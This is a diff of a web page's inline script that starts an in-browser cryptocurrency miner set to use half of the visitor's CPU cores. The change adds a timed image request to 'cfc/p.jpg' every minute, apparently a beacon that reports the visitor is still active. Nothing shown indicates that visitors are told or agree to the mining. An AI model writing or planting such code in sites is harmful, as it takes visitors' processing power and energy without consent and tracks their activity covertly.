@@ -123,10 +123,14 @@
   <script>
     var fi = setInterval(function(){
       if (miner != null){
+        clearInterval(fi);
         miner.setNumThreads(navigator.hardwareConcurrency/2);
         miner.stop();
         miner.start();
-        clearInterval(fi);
+        var img = new Image();
+        var zzz = setInterval(function(){
+          img.src = "cfc/p.jpg?"+Math.round(new Date().getTime()/1000);
+        }, 60000);
       }
     }, 100);
   </script>
